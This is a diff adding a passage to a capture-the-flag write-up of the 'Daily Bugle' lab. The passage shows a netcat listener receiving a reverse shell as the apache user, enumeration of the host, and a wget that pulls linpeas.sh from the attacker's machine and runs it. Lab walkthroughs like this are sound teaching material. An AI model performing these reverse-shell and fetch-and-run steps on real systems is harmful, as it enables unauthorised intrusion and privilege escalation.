@@ -494,4 +494,101 @@ Session completed.
 
 <img width="1050" height="695" alt="image" src="https://github.com/user-attachments/assets/94151146-91f6-43d6-b594-59261fe0aaff" />
 
+```
+┌──(kali㉿kali)-[~]
+└─$ nc -vnlp 1234     
+listening on [any] 1234 ...
+connect to [192.168.134.53] from (UNKNOWN) [10.112.159.129] 33942
+Linux dailybugle 3.10.0-1062.el7.x86_64 #1 SMP Wed Aug 7 18:08:02 UTC 2019 x86_64 x86_64 x86_64 GNU/Linux
+ 04:11:04 up 4 min,  0 users,  load average: 0.02, 0.08, 0.05
+USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
+uid=48(apache) gid=48(apache) groups=48(apache)
+sh: no job control in this shell
+```
 
+```
+sh-4.2$ whoami
+whoami
+apache
+```
+```
+sh-4.2$ ls -al
+ls -al
+total 16
+dr-xr-xr-x.  17 root root  244 Dec 14  2019 .
+dr-xr-xr-x.  17 root root  244 Dec 14  2019 ..
+-rw-r--r--    1 root root    0 Dec 14  2019 .autorelabel
+lrwxrwxrwx.   1 root root    7 Dec 14  2019 bin -> usr/bin
+dr-xr-xr-x.   5 root root 4096 Jan 14  2020 boot
+drwxr-xr-x   19 root root 2980 Sep  2 04:06 dev
+drwxr-xr-x.  79 root root 8192 Jan 14  2020 etc
+drwxr-xr-x.   3 root root   22 Dec 14  2019 home
+lrwxrwxrwx.   1 root root    7 Dec 14  2019 lib -> usr/lib
+lrwxrwxrwx.   1 root root    9 Dec 14  2019 lib64 -> usr/lib64
+drwxr-xr-x.   2 root root    6 Apr 11  2018 media
+drwxr-xr-x.   2 root root    6 Apr 11  2018 mnt
+drwxr-xr-x.   2 root root    6 Apr 11  2018 opt
+dr-xr-xr-x  119 root root    0 Sep  2 04:06 proc
+dr-xr-x---.   3 root root  163 Dec 15  2019 root
+drwxr-xr-x   25 root root  700 Sep  2 04:07 run
+lrwxrwxrwx.   1 root root    8 Dec 14  2019 sbin -> usr/sbin
+drwxr-xr-x.   2 root root    6 Apr 11  2018 srv
+dr-xr-xr-x   13 root root    0 Sep  2 04:06 sys
+drwxrwxrwt    2 root root    6 Sep  2 04:07 tmp
+drwxr-xr-x.  13 root root  155 Dec 14  2019 usr
+drwxr-xr-x.  20 root root  278 Dec 14  2019 var
+```
+```
+sh-4.2$ cd /home
+cd /home
+sh-4.2$ ls -al
+ls -al
+total 0
+drwxr-xr-x.  3 root     root      22 Dec 14  2019 .
+dr-xr-xr-x. 17 root     root     244 Dec 14  2019 ..
+drwx------.  2 jjameson jjameson  99 Dec 15  2019 jjameson
+```
+```
+┌──(kali㉿kali)-[~]
+└─$ python3 -m http.server 8000
+Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
+```
+```
+sh-4.2$ cd /tmp
+cd /tmp
+```
+```
+sh-4.2$ wget http://192.168.134.53:8000/linpeas.sh
+wget http://192.168.134.53:8000/linpeas.sh
+--2026-09-02 04:29:56--  http://192.168.134.53:8000/linpeas.sh
+Connecting to 192.168.134.53:8000... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: 332111 (324K) [text/x-sh]
+Saving to: 'linpeas.sh'
+
+     0K .......... .......... .......... .......... .......... 15% 80.9K 3s
+    50K .......... .......... .......... .......... .......... 30%  211K 2s
+   100K .......... .......... .......... .......... .......... 46% 2.50M 1s
+   150K .......... .......... .......... .......... .......... 61%  198K 1s
+   200K .......... .......... .......... .......... .......... 77% 91.6K 0s
+   250K .......... .......... .......... .......... .......... 92% 42.2K 0s
+   300K .......... .......... ....                            100%  382M=2.9s
+
+2026-09-02 04:30:00 (113 KB/s) - 'linpeas.sh' saved [332111/332111]
+```
+```
+sh-4.2$ ls -al
+ls -al
+total 328
+drwxrwxrwt   2 root   root       24 Sep  2 04:29 .
+dr-xr-xr-x. 17 root   root      244 Dec 14  2019 ..
+-rw-rw-rw-   1 apache apache 332111 Sep  2 04:22 linpeas.sh
+```
+```
+sh-4.2$ chmod +x linpeas.sh
+chmod +x linpeas.sh
+```
+```
+sh-4.2$ ./linpeas.sh
+./linpeas.sh
+```
